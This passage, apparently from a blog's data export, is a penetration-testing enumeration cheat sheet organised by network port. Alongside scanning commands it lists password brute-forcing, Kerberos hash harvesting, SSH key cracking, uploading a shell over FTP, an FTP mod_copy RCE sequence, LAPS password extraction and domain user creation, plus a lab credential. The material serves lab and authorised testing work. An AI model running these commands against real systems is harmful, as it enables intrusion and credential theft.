database\nsqlitebrowser\n```\n```sql\nshow databases;\nuse db_name;\nshow tables;\nselect * from table_name;\nselect * from table_name \\G\n```\n```bash check for credentials\nfind / -type f -name wp-config.php 2>/dev/null\n```\n\n<br>\n\n## Port 3389/TCP - RDP\n```bash authenticate\nxfreerdp /u:username /p:'password' /v:$IP /f +clipboard # /d:domain /cert:ignore\nrdesktop $IP -d $domain -u $username -p '$password'\nremmina -c rdp://user@$IP\n```\n```bash check credentials\nimpacket-rdp_check $domain/$username:$password@$IP\n# look for an username upon connecting\nrdesktop -u \"\" -a $IP\n```\n\n<br>\n\n## Port 6667/TCP,6697/TCP - IRC\n```bash manual inspection\nnc -nv $IP 6667 # connect to server\nUSER admin * 0 admin ; NICK admin # authenticate\nadmin? ADMIN # list commands\n```\n```bash irssi\nirssi -c $IP -p 6697 - /exit\n```\n\n<br>\n\n## Port 11211/TCP - memcache\n```bash\necho \"stats items\" | nc -vn -w 1 $IP 11211  # Get items of slabs with info\necho \"get <item_name>\" | nc -vn -w 1 $IP 11211  # Get saved info\n```\n\n<br>\n\n---\n---\n","source":"_posts/Pentesting/Linux/3.md","raw":"---\ntitle: 3. Enumeration - Linux\ndate: 2024-08-02 11:00:00\ncategories:\n  - Pentesting\n  - Linux\ntags:\n  - Pentesting\n  - Windows\n  - Linux\ntoc: true\n---\n\n---\nStep 3 in a penetration test: Enumeration.\nTry to find relevant info to enter the target machine.\n\n---\n<!-- more -->\n\n<br>\n\n## Port 21/TCP - FTP\n```bash\nnmap --script=*ftp* -p21 $IP -oN recon/nmap.ftp\n\nftp-user-enum.pl -U users.txt -t $IP\n```\n```bash write permissions\n# mount/unmount shares\ncurlftpfs anonymous@$IP ftp-local-mount-dir/\nfusermount -u ftp\n\n# upload files with curl\ncurl -v -P - 'ftp://username:password@$IP/files/' -T \"/var/www/html/shell.sh\"\n\n# upload files manually, depending on file type\n> ascii\n> binary\n> put $file\n```\n```bash no access to view files\nquote PASV\n```\n```mod_copy RCE vsftpd 1.3.5\nnc -v $IP 21\nsite cpfr /my/local/file\nsite cpto /directory/i-have/access-to\n```\n```bash download all files recursively\nwget -r ftp://anonymous:@$IP\n```\n\n<br>\n\n## Port 22/TCP - SSH\n```bash execute command upon login\nssh -t user@$IP 'id; bash -l'\n```\n```bash passphrase-protected private key\nssh2john id_rsa > hash\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt\n```\n```bash SSH tunnels\n# local\nssh -L $local_IP:$local_port:destination_IP:$destination_port user@$SSH_server\n# remote\nssh -R $remote_IP:$remote_port:destination_IP:$destination_port user@$SSH_server\n# do not execute a command\n# -N\n# run in the background\n# -f\n```\n\n<br>\n\n## Port 23/TCP - Telnet\n```bash\nnmap -n -sV -Pn --script \"*telnet* and safe\" -p 23 $IP -oN recon/nmap.telnet\n```\n\n<br>\n\n## Port 25,465,587/TCP - SMTP\n```bash\nnmap --script smtp-enum-users $IP -oN recon/nmap.smtp-users\nnmap -p25 --script smtp-commands $IP -oN recon/nmap.smtp-comm\n\n# if NTLM auth is enabled (WINDOWS)\nnmap -sS -v --script=*-ntlm-info --script-timeout=60s $domain -oN recon/nmap.smtp-ntlm\n```\n```bash\n# modes: EXPN, VRFY or RCPT (default: VRFY)\nsmtp-user-enum -u $USER -t $IP -M $MODE \n```\n```bash\nmsfconsole -q -x \"use auxiliary/scanner/smtp/smtp_enum; set RHOSTS $IP; run\"\n```\n```bash\nswaks --to user@example.com --server test-server.example.net\n```\n\n<br>\n\n## Port 43/TCP - WHOIS\n```bash\nwhois -h $IP -p 43 \"$domain\"\necho \"$domain\" | nc -vn $IP\n```\n\n<br>\n\n## Port 53/TCP/UDP - DNS\n```bash\nnmap -n --script \"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\" $IP -oN recon/nmap.dns\ndnscan.py -d $domain -r -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n```\n```bash query info about the server\ndig @$IP $domain\n```\n```bash zone transfer (TCP)\ndnsrecon -d $domain -t axfr\ndig axfr $domain ns08.$domain\n```\n```bash bruteforce subdomains\nwfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u \"$domain\" -H \"Host: FUZZ.$domain\" --hl 7\ngobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u $domain\nnmap -T4 -p 53 --script dns-brute $domain\n```\n\n<br>\n\n## Port 69/TCP - TFTP\n```bash\nnmap -n -Pn -sU -p69 -sV --script tftp-enum $IP -oN recon/nmap.tftp\n```\n```bash download/upload\nmsfconsole -q -x \"use auxiliary/admin/tftp/tftp_transfer_util; set RHOSTS $IP; run\"\n```\n\n<br>\n\n## Port 80/TCP,443/HTTPs - HTTP,HTTPS\n```bash Enumerate web server based on .ds_store\npython ds_walk.py -u $URL\n```\n```bash\npython3 iis_shortname_Scan.py $URL\n```\n\n<br>\n\n## Port 88/TCP,UDP - Kerberos\n```bash enumerate users (need users list)\n nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=\"$domain\",userdb=/path/to/userlist $IP -oN recon/nmap.kerberos-enum-u\n```\n```bash bruteforce passwords\n# linux\nkerbrute -domain $domain -users users.txt -passwords passwords.txt -outputfile recon/kerbrute.out\n# windows\n.\\Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:$domain /outfile:rubeus.txt\n```\n```bash harvest the non-preauth AS_REP responses\nimpacket-GetNPUsers $domain/ -usersfile users.txt -format hashcat -outputfile files/hashes.out\n```\n```bash [with creds] get a list of SPNs (service principal names)\nimpacket-GetUserSPNs -request -dc-ip $IP active.htb/svc_tgs\n```\n\n<br>\n\n## Port 110/TCP,995/TCP - POP3,POP3S\n```bash grab banner\nnc -nv $IP 110\nopenssl s_client -crlf -connect $IP:995\n```\n```bash NTLM info disclosure\nnmap -p 110,995 --script pop3-ntlm-info $IP -oN nmap/pop3-ntlm\n```\n```bash capabilities\nnmap -p 110,995 --script pop3-capabilities $IP -oN nmap/pop3-cap\n```\n```bash commands \nUSER    Username or mailbox.\nPASS    Server/mailbox-specific password.\nSTAT    Number of messages in the mailbox.\nLIST    [ message# ] Messages summary.\nRETR    [ message# ] Retrieve selected message.\nDELE    [ message# ] Delete selected message.\nRSET    Reset the session. Restore deleted messages.\nNOOP    No-op. Keeps connection open.\nQUIT    End session.\n```\n\n<br>\n\n## Port 111/TCP - RPCbind\n```bash\nrpcinfo $IP\n# RPC + NFS   = list, download, upload shares\n# NIS         = ypbind - sensitive files\n# RPC users   = rusersd - enumerate users\n```\n\n<br>\n\n## Port 135/TCP - MSRPC\n```bash\nnmap -sV -script msrpc-enum -Pn $IP -oN recon/nmap.msrpc\n```\n```bash dump\n# RPC endpoints\nimpacket-rpcdump $IP\n\n# SAMR info\nimpacket-samrdump $IP\n```\n```bash\nrpcclient -U \"\" -N $IP\nrpcclient -U user%domain@$IP\nrpcclient //$IP -U $domain/user%$hash --pw-nt-hash\n```\n```bash commands\n> enumprinters\n> enumdomains\n\n> enumdomusers\n\n> queryuser $username\n\n> enumdomgroups\n\n> querygroup 0x$number\n\n> querydominfo\n> querydispinfo\n> enumprivs\n> getdompwinfo\n> getusrdompwinfo 0xnumber\n> dsroledominfo\n> netshareenum\n> netshareenumall\n\n> createdomuser $username\n> setuserinfo2 $username 24 $password\n> lookupnames $username\n\n> chgpasswd $username $old-pass $new-pass\n```\n\n<br>\n\n## Port 137/TCP/UDP,138/UDP,139/TCP - NetBIOS\n```bash\nsudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n $IP -oN recon/nmap.nbtstat\n```\n```bash\n# linux\nnmblookup -A $IP\nnbtscan -v $IP\n# windows\nnbstat -A $IP\n```\n\n<br>\n\n## Port 139/TCP,445/TCP - NetBIOS,SMB\n```bash\nenum4linux -avA $IP > recon/enum4linux.out\nenum4linux -avA $IP -u user -p pass > recon/enum4linux.out\n```\n```bash hostname\nnmblookup -A $IP\nnbtscan -r $NET\n```\n```bash domain info\npolenum '':''@$IP 2>&1\n```\n```bash server info\nrpcclient -W 'WORKGROUP' -U''%'' -c 'srvinfo' $IP 2>&1\n```\n```bash version\nmsfconsole -q -x 'use /scanner/smb/smb_version ; set rhosts $IP; run'\n```\n```bash usernames\nnet rpc group members 'None' -W 'WORKGROUP' -I $IP -U''%'' 2>&1\nrpcclient -W 'WORKGROUP' -c querydispinfo -U''%'' $IP 2>&1\n```\n```bash vulns\nnmap --script smb-vuln* -p 139,445 $IP\n```\n```bash list shares\nnmap --script \"safe or smb-enum-*\" -p 139,445 $IP -oN recon/nmap.smb\n\n# [smbmap] list share (-r) and retrieve share (-A)\nsmbmap -H $IP -r -u 'anonymous'\nsmbmap -H return.local -u svc-printer -p \"1edFg43012\\!\\!\" -r \n\nsmbclient -N -L \\\\\\\\$IP \nsmbclient -N \\\\\\\\$IP\\\\Share --client-protection=off\nsmbclient -U 'user%passwd' -L //$IP\nsmbclient //$IP/Share -U user --pw-nt-hash $hash -W $domain\n\n# download files recursively\nsmbclient '\\\\\\\\$IP\\\\share' -N -c 'prompt OFF ; recurse ON ; cd \"where\\from\" ; lcd \"where/to\" ; mget *'\n```\n```bash authentication bruteforce\nhydra -L user.txt -P pass.txt $IP smb\nacccheck -t $IP -v -u user -P /usr/share/dirb/wordlist/common.txt\n```\n\n<br>\n\n## Port 143/TCP,993/TCP - IMAP,IMAPS\n```bash\nnc -nv $IP 143\nopenssl s_client -connect $IP:993 -quiet\n```\n```bash GUI applications\nevolution\nthunderbird\n```\n```bash IMAP commands\n# login\nA1 LOGIN \"username\" \"password\"\n# list folders/mailboxes\nA1 LIST \"\" *\nA1 LIST INBOX *\nA1 LIST \"Archive\" *\n# select a mailbox\nA1 SELECT INBOX\n# list messages\nA1 FETCH 1:* (FLAGS)\nA1 UID FETCH 1:* (FLAGS)\n# view messages\nA1 FETCH 2 body[text]\nA1 FETCH 2 all\nA1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])\n```\n```bash view and download messages with curl\n# view\ncurl -k 'imaps://$IP/' --user user:pass\ncurl -k 'imaps://$IP/inbox_name?ALL' --user user:pass \ncurl -k 'imaps://1.2.3.4/Drafts?TEXT password' --user user:pass\n# download\ncurl -k 'imaps://1.2.3.4/Drafts;MAILINDEX=1' --user user:pass\n```\n```bash NTLM auth info disclosure\nnmap -p 143,993 --script imap-ntlm-info $IP -oN recon/nmap.imap-ntlm\n```\n```bash bruteforce passwords\nhydra -I -V -F -l user -P /usr/share/wordlists/rockyou.txt $IP imap \nhydra -S -V -l user -P /usr/share/wordlists/rockyou.txt -s 993 $IP imap\n```\n\n<br>\n\n## Port 161/TCP,162/UDP - SNMP\n```bash\nxprobe2 -v -p udp:161:open $IP\n```\n\n<br>\n\n## Port 389/TCP,636/TCP,3269/TCP - LDAP,tcpwrapped\n```bash enumeration\nnmap -n -sV --script \"ldap* and not brute\" $IP -oN recon/nmap.ldap\n```\n```bash ldapsearch\n# null creds\nldapsearch -x -H ldap://$IP -D '' -w '' -b \"DC=domain,DC=name\"\n# authenticate\nldapsearch -x -H ldap://$IP -D '$domain\\user' -w 'password' -b \"CN=Remote Desktop Users,CN=Builtin,DC=domain,DC=name\"\n# extract info anonymously\nldapsearch -x -H ldaps://$IP:636/ -s base -b '' \"(objectClass=*)\" \"*\" +\n# check admin password if LAPS is enabled\nldapsearch -x -H ldap://$IP -D '$domain\\user' -w 'password' -b \"dc=domain,dc=name\" \"(ms-MCS-AdmPwd=*)\" ms-MCS-AdmPwd\n```\n\n<br>\n\n## Port 500/TCP - IKE\n> Internet Key Exchange (IKE), used to establish an IPsec VPN\n\n```bash\nike-scan -M $IP\nike-scan -M --ikev2 $IP\n```\n\n<br>\n\n## Port 2049/TCP - NFS\n```bash\nnmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP -oN recon/nmap.nfs-enum\nnmap --script \"nfs-ls, nfs-showmount, nfs-statfs\" $IP- oN recon/nmap.nfs-list\n```\n```bash\nshowmount -e $IP\nmsfconsole -q -x \"use auxiliary/scanner/nfs/nfsmount; set RHOSTS $IP; run\"\n# check config files\n# /etc/exports\n# /etc/lib/nfs/etab\n```\n```bash mount/unmount shares\n# create mount point\nsudo mkdir /mnt/local_share\n# mount the opn share\nsudo mount -t nfs -o rw,vers=2 $IP:/share_name /mnt/local_share\n# unmount share\nsudo umount /mnt/nfs-share\n\n# match the user with UID and GID if mounting a share with restricted permissions\npython2 ~/tools/NfSpy/nfspy.py -o server=$IP:/share_name,nfsport=2049/tcp,rw /mnt/local_share\n```\n\n<br>\n\n## Port 3306/TCP - MySQL\n```bash \nnmap -sV -Pn -T4 -vv -script=mysql* $IP -p 3306 -oN recon/nmap.mysql\n```\n```bash interact with the DB\nmysql -u'root' -p'root' -h $IP -D database\nsqlitebrowser\n```\n```sql\nshow databases;\nuse db_name;\nshow tables;\nselect * from table_name;\nselect * from table_name \\G\n```\n```bash check for credentials\nfind / -type f -name wp-config.php 2>/dev/null\n```\n\n<br>\n\n## Port 3389/TCP - RDP\n```bash authenticate\nxfreerdp /u:username /p:'password' /v:$IP /f +clipboard # /d:domain /cert:ignore\nrdesktop $IP -d $domain -u $username -p '$password'\nremmina -c rdp://user@$IP\n```\n```bash check credentials\nimpacket-rdp_check $domain/$username:$password@$IP\n# look for an username upon connecting\nrdesktop -u \"\" -a $IP\n```\n\n<br>\n\n## Port 6667/TCP,6697/TCP - IRC\n```bash manual inspection\nnc -nv $IP 6667 # connect to server\nUSER admin * 0 admin ; NICK admin # authenticate\nadmin? ADMIN # list commands\n```\n```bash irssi\nirssi -c $IP -p 6697 - /exit\n```\n\n<br>\n\n## Port 11211/TCP - memcache\n```bash\necho \"stats items\" | nc -vn -w 1 $IP 11211  # Get items of slabs with info\necho \"get <item_name>\" | nc -vn -w 1 $IP 11211  # Get saved info\n```\n\n<br>\n\n---\n---\n","slug":"Pentesting/Linux/3","published":1,"updated":"2024-09-23T06:18:55.856Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhh00076gvg4jbr3qh2","content":"<hr>\n<p>Step 3 in a penetration test: Enumeration.<br>Try to find relevant info to enter the target machine.</p>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"Port-21-TCP-FTP\"><a href=\"#Port-21-TCP-FTP\" class=\"headerlink\" title=\"Port 21&#x2F;TCP - FTP\"></a>Port 21&#x2F;TCP - FTP</h2><pre><code class=\"highlight bash\">nmap --script=*ftp* -p21 <span class=\"variable\">$IP</span> -oN recon/nmap.ftp\n\nftp-user-enum.pl -U users.txt -t <span class=\"variable\">$IP</span></code></pre>\n<pre><div class=\"caption\"><span>write permissions</span></div><code class=\"highlight bash\"><span class=\"comment\"># mount/unmount shares</span>\ncurlftpfs anonymous@<span class=\"variable\">$IP</span> ftp-local-mount-dir/\nfusermount -u ftp\n\n<span class=\"comment\"># upload files with curl</span>\ncurl -v -P - <span class=\"string\">&#x27;ftp://username:password@$IP/files/&#x27;</span> -T <span class=\"string\">&quot;/var/www/html/shell.sh&quot;</span>\n\n<span class=\"comment\"># upload files manually, depending on file type</span>\n&gt; ascii\n&gt; binary\n&gt; put <span class=\"variable\">$file</span></code></pre>\n<pre><div class=\"caption\"><span>no access to view files</span></div><code class=\"highlight bash\">quote PASV</code></pre>\n<pre><div class=\"caption\"><span>RCE vsftpd 1.3.5</span></div><code class=\"highlight mod_copy\">nc -v $IP 21\nsite cpfr /my/local/file\nsite cpto /directory/i-have/access-to</code></pre>\n<pre><div class=\"caption\"><span>download all files recursively</span></div><code class=\"highlight bash\">wget -r ftp://anonymous:@<span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-22-TCP-SSH\"><a href=\"#Port-22-TCP-SSH\" class=\"headerlink\" title=\"Port 22&#x2F;TCP - SSH\"></a>Port 22&#x2F;TCP - SSH</h2><pre><div class=\"caption\"><span>execute command upon login</span></div><code class=\"highlight bash\">ssh -t user@<span class=\"variable\">$IP</span> <span class=\"string\">&#x27;id; bash -l&#x27;</span></code></pre>\n<pre><div class=\"caption\"><span>passphrase-protected private key</span></div><code class=\"highlight bash\">ssh2john id_rsa &gt; <span class=\"built_in\">hash</span>\njohn <span class=\"built_in\">hash</span> --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>\n<pre><div class=\"caption\"><span>SSH tunnels</span></div><code class=\"highlight bash\"><span class=\"comment\"># local</span>\nssh -L <span class=\"variable\">$local_IP</span>:<span class=\"variable\">$local_port</span>:destination_IP:<span class=\"variable\">$destination_port</span> user@<span class=\"variable\">$SSH_server</span>\n<span class=\"comment\"># remote</span>\nssh -R <span class=\"variable\">$remote_IP</span>:<span class=\"variable\">$remote_port</span>:destination_IP:<span class=\"variable\">$destination_port</span> user@<span class=\"variable\">$SSH_server</span>\n<span class=\"comment\"># do not execute a command</span>\n<span class=\"comment\"># -N</span>\n<span class=\"comment\"># run in the background</span>\n<span class=\"comment\"># -f</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-23-TCP-Telnet\"><a href=\"#Port-23-TCP-Telnet\" class=\"headerlink\" title=\"Port 23&#x2F;TCP - Telnet\"></a>Port 23&#x2F;TCP - Telnet</h2><pre><code class=\"highlight bash\">nmap -n -sV -Pn --script <span class=\"string\">&quot;*telnet* and safe&quot;</span> -p 23 <span class=\"variable\">$IP</span> -oN recon/nmap.telnet</code></pre>\n\n<br>\n\n<h2 id=\"Port-25-465-587-TCP-SMTP\"><a href=\"#Port-25-465-587-TCP-SMTP\" class=\"headerlink\" title=\"Port 25,465,587&#x2F;TCP - SMTP\"></a>Port 25,465,587&#x2F;TCP - SMTP</h2><pre><code class=\"highlight bash\">nmap --script smtp-enum-users <span class=\"variable\">$IP</span> -oN recon/nmap.smtp-users\nnmap -p25 --script smtp-commands <span class=\"variable\">$IP</span> -oN recon/nmap.smtp-comm\n\n<span class=\"comment\"># if NTLM auth is enabled (WINDOWS)</span>\nnmap -sS -v --script=*-ntlm-info --script-timeout=60s <span class=\"variable\">$domain</span> -oN recon/nmap.smtp-ntlm</code></pre>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># modes: EXPN, VRFY or RCPT (default: VRFY)</span>\nsmtp-user-enum -u <span class=\"variable\">$USER</span> -t <span class=\"variable\">$IP</span> -M <span class=\"variable\">$MODE</span></code></pre>\n<pre><code class=\"highlight bash\">msfconsole -q -x <span class=\"string\">&quot;use auxiliary/scanner/smtp/smtp_enum; set RHOSTS <span class=\"variable\">$IP</span>; run&quot;</span></code></pre>\n<pre><code class=\"highlight bash\">swaks --to user@example.com --server test-server.example.net</code></pre>\n\n<br>\n\n<h2 id=\"Port-43-TCP-WHOIS\"><a href=\"#Port-43-TCP-WHOIS\" class=\"headerlink\" title=\"Port 43&#x2F;TCP - WHOIS\"></a>Port 43&#x2F;TCP - WHOIS</h2><pre><code class=\"highlight bash\">whois -h <span class=\"variable\">$IP</span> -p 43 <span class=\"string\">&quot;<span class=\"variable\">$domain</span>&quot;</span>\n<span class=\"built_in\">echo</span> <span class=\"string\">&quot;<span class=\"variable\">$domain</span>&quot;</span> | nc -vn <span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-53-TCP-UDP-DNS\"><a href=\"#Port-53-TCP-UDP-DNS\" class=\"headerlink\" title=\"Port 53&#x2F;TCP&#x2F;UDP - DNS\"></a>Port 53&#x2F;TCP&#x2F;UDP - DNS</h2><pre><code class=\"highlight bash\">nmap -n --script <span class=\"string\">&quot;(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport&quot;</span> <span class=\"variable\">$IP</span> -oN recon/nmap.dns\ndnscan.py -d <span class=\"variable\">$domain</span> -r -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></pre>\n<pre><div class=\"caption\"><span>query info about the server</span></div><code class=\"highlight bash\">dig @<span class=\"variable\">$IP</span> <span class=\"variable\">$domain</span></code></pre>\n<pre><div class=\"caption\"><span>zone transfer (TCP)</span></div><code class=\"highlight bash\">dnsrecon -d <span class=\"variable\">$domain</span> -t axfr\ndig axfr <span class=\"variable\">$domain</span> ns08.<span class=\"variable\">$domain</span></code></pre>\n<pre><div class=\"caption\"><span>bruteforce subdomains</span></div><code class=\"highlight bash\">wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u <span class=\"string\">&quot;<span class=\"variable\">$domain</span>&quot;</span> -H <span class=\"string\">&quot;Host: FUZZ.<span class=\"variable\">$domain</span>&quot;</span> --hl 7\ngobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u <span class=\"variable\">$domain</span>\nnmap -T4 -p 53 --script dns-brute <span class=\"variable\">$domain</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-69-TCP-TFTP\"><a href=\"#Port-69-TCP-TFTP\" class=\"headerlink\" title=\"Port 69&#x2F;TCP - TFTP\"></a>Port 69&#x2F;TCP - TFTP</h2><pre><code class=\"highlight bash\">nmap -n -Pn -sU -p69 -sV --script tftp-enum <span class=\"variable\">$IP</span> -oN recon/nmap.tftp</code></pre>\n<pre><div class=\"caption\"><span>download/upload</span></div><code class=\"highlight bash\">msfconsole -q -x <span class=\"string\">&quot;use auxiliary/admin/tftp/tftp_transfer_util; set RHOSTS <span class=\"variable\">$IP</span>; run&quot;</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-80-TCP-443-HTTPs-HTTP-HTTPS\"><a href=\"#Port-80-TCP-443-HTTPs-HTTP-HTTPS\" class=\"headerlink\" title=\"Port 80&#x2F;TCP,443&#x2F;HTTPs - HTTP,HTTPS\"></a>Port 80&#x2F;TCP,443&#x2F;HTTPs - HTTP,HTTPS</h2><pre><div class=\"caption\"><span>Enumerate web server based on .ds_store</span></div><code class=\"highlight bash\">python ds_walk.py -u <span class=\"variable\">$URL</span></code></pre>\n<pre><code class=\"highlight bash\">python3 iis_shortname_Scan.py <span class=\"variable\">$URL</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-88-TCP-UDP-Kerberos\"><a href=\"#Port-88-TCP-UDP-Kerberos\" class=\"headerlink\" title=\"Port 88&#x2F;TCP,UDP - Kerberos\"></a>Port 88&#x2F;TCP,UDP - Kerberos</h2><pre><div class=\"caption\"><span>enumerate users (need users list)</span></div><code class=\"highlight bash\">nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=<span class=\"string\">&quot;<span class=\"variable\">$domain</span>&quot;</span>,userdb=/path/to/userlist <span class=\"variable\">$IP</span> -oN recon/nmap.kerberos-enum-u</code></pre>\n<pre><div class=\"caption\"><span>bruteforce passwords</span></div><code class=\"highlight bash\"><span class=\"comment\"># linux</span>\nkerbrute -domain <span class=\"variable\">$domain</span> -<span class=\"built_in\">users</span> users.txt -passwords passwords.txt -outputfile recon/kerbrute.out\n<span class=\"comment\"># windows</span>\n.\\Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:<span class=\"variable\">$domain</span> /outfile:rubeus.txt</code></pre>\n<pre><div class=\"caption\"><span>harvest the non-preauth AS_REP responses</span></div><code class=\"highlight bash\">impacket-GetNPUsers <span class=\"variable\">$domain</span>/ -usersfile users.txt -format hashcat -outputfile files/hashes.out</code></pre>\n<pre><div class=\"caption\"><span>[with creds] get a list of SPNs (service principal names)</span></div><code class=\"highlight bash\">impacket-GetUserSPNs -request -dc-ip <span class=\"variable\">$IP</span> active.htb/svc_tgs</code></pre>\n\n<br>\n\n<h2 id=\"Port-110-TCP-995-TCP-POP3-POP3S\"><a href=\"#Port-110-TCP-995-TCP-POP3-POP3S\" class=\"headerlink\" title=\"Port 110&#x2F;TCP,995&#x2F;TCP - POP3,POP3S\"></a>Port 110&#x2F;TCP,995&#x2F;TCP - POP3,POP3S</h2><pre><div class=\"caption\"><span>grab banner</span></div><code class=\"highlight bash\">nc -nv <span class=\"variable\">$IP</span> 110\nopenssl s_client -crlf -connect <span class=\"variable\">$IP</span>:995</code></pre>\n<pre><div class=\"caption\"><span>NTLM info disclosure</span></div><code class=\"highlight bash\">nmap -p 110,995 --script pop3-ntlm-info <span class=\"variable\">$IP</span> -oN nmap/pop3-ntlm</code></pre>\n<pre><div class=\"caption\"><span>capabilities</span></div><code class=\"highlight bash\">nmap -p 110,995 --script pop3-capabilities <span class=\"variable\">$IP</span> -oN nmap/pop3-<span class=\"built_in\">cap</span></code></pre>\n<pre><div class=\"caption\"><span>commands</span></div><code class=\"highlight bash\">USER    Username or mailbox.\nPASS    Server/mailbox-specific password.\nSTAT    Number of messages <span class=\"keyword\">in</span> the mailbox.\nLIST    [ message# ] Messages summary.\nRETR    [ message# ] Retrieve selected message.\nDELE    [ message# ] Delete selected message.\nRSET    Reset the session. Restore deleted messages.\nNOOP    No-op. Keeps connection open.\nQUIT    End session.</code></pre>\n\n<br>\n\n<h2 id=\"Port-111-TCP-RPCbind\"><a href=\"#Port-111-TCP-RPCbind\" class=\"headerlink\" title=\"Port 111&#x2F;TCP - RPCbind\"></a>Port 111&#x2F;TCP - RPCbind</h2><pre><code class=\"highlight bash\">rpcinfo <span class=\"variable\">$IP</span>\n<span class=\"comment\"># RPC + NFS   = list, download, upload shares</span>\n<span class=\"comment\"># NIS         = ypbind - sensitive files</span>\n<span class=\"comment\"># RPC users   = rusersd - enumerate users</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-135-TCP-MSRPC\"><a href=\"#Port-135-TCP-MSRPC\" class=\"headerlink\" title=\"Port 135&#x2F;TCP - MSRPC\"></a>Port 135&#x2F;TCP - MSRPC</h2><pre><code class=\"highlight bash\">nmap -sV -script msrpc-enum -Pn <span class=\"variable\">$IP</span> -oN recon/nmap.msrpc</code></pre>\n<pre><div class=\"caption\"><span>dump</span></div><code class=\"highlight bash\"><span class=\"comment\"># RPC endpoints</span>\nimpacket-rpcdump <span class=\"variable\">$IP</span>\n\n<span class=\"comment\"># SAMR info</span>\nimpacket-samrdump <span class=\"variable\">$IP</span></code></pre>\n<pre><code class=\"highlight bash\">rpcclient -U <span class=\"string\">&quot;&quot;</span> -N <span class=\"variable\">$IP</span>\nrpcclient -U user%domain@<span class=\"variable\">$IP</span>\nrpcclient //<span class=\"variable\">$IP</span> -U <span class=\"variable\">$domain</span>/user%<span class=\"variable\">$hash</span> --pw-nt-hash</code></pre>\n<pre><div class=\"caption\"><span>commands</span></div><code class=\"highlight bash\">&gt; enumprinters\n&gt; enumdomains\n\n&gt; enumdomusers\n\n&gt; queryuser <span class=\"variable\">$username</span>\n\n&gt; enumdomgroups\n\n&gt; querygroup 0x<span class=\"variable\">$number</span>\n\n&gt; querydominfo\n&gt; querydispinfo\n&gt; enumprivs\n&gt; getdompwinfo\n&gt; getusrdompwinfo 0xnumber\n&gt; dsroledominfo\n&gt; netshareenum\n&gt; netshareenumall\n\n&gt; createdomuser <span class=\"variable\">$username</span>\n&gt; setuserinfo2 <span class=\"variable\">$username</span> 24 <span class=\"variable\">$password</span>\n&gt; lookupnames <span class=\"variable\">$username</span>\n\n&gt; chgpasswd <span class=\"variable\">$username</span> <span class=\"variable\">$old</span>-pass <span class=\"variable\">$new</span>-pass</code></pre>\n\n<br>\n\n<h2 id=\"Port-137-TCP-UDP-138-UDP-139-TCP-NetBIOS\"><a href=\"#Port-137-TCP-UDP-138-UDP-139-TCP-NetBIOS\" class=\"headerlink\" title=\"Port 137&#x2F;TCP&#x2F;UDP,138&#x2F;UDP,139&#x2F;TCP - NetBIOS\"></a>Port 137&#x2F;TCP&#x2F;UDP,138&#x2F;UDP,139&#x2F;TCP - NetBIOS</h2><pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n <span class=\"variable\">$IP</span> -oN recon/nmap.nbtstat</code></pre>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># linux</span>\nnmblookup -A <span class=\"variable\">$IP</span>\nnbtscan -v <span class=\"variable\">$IP</span>\n<span class=\"comment\"># windows</span>\nnbstat -A <span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h2 id=\"Port-139-TCP-445-TCP-NetBIOS-SMB\"><a href=\"#Port-139-TCP-445-TCP-NetBIOS-SMB\" class=\"headerlink\" title=\"Port 139&#x2F;TCP,445&#x2F;TCP - NetBIOS,SMB\"></a>Port 139&#x2F;TCP,445&#x2F;TCP - NetBIOS,SMB</h2><pre><code class=\"highlight bash\">enum4linux -avA <span class=\"variable\">$IP</span> &gt; recon/enum4linux.out\nenum4linux -avA <span class=\"variable\">$IP</span> -u user -p pass &gt; recon/enum4linux.out</code></pre>\n<pre><div class=\"caption\"><span>hostname</span></div><code class=\"highlight bash\">nmblookup -A <span class=\"variable\">$IP</span>\nnbtscan -r <span class=\"variable\">$NET</span></code></pre>\n<pre><div class=\"caption\"><span>domain info</span></div><code class=\"highlight bash\">polenum <span class=\"string\">&#x27;&#x27;</span>:<span class=\"string\">&#x27;&#x27;</span>@<span class=\"variable\">$IP</span> 2&gt;&amp;1</code></pre>\n<pre><div class=\"caption\"><span>server info</span></div><code class=\"highlight bash\">rpcclient -W <span class=\"string\">&#x27;WORKGROUP&#x27;</span> -U<span class=\"string\">&#x27;&#x27;</span>%<span class=\"string\">&#x27;&#x27;</span> -c <span class=\"string\">&#x27;srvinfo&#x27;</span> <span class=\"variable\">$IP</span> 2&gt;&amp;1</code></pre>\n<pre><div class=\"caption\"><span>version</span></div><code class=\"highlight bash\">msfconsole -q -x <span class=\"string\">&#x27;use /scanner/smb/smb_version ; set rhosts $IP; run&#x27;</span></code></pre>\n<pre><div class=\"caption\"><span>usernames</span></div><code class=\"highlight bash\">net rpc group members <span 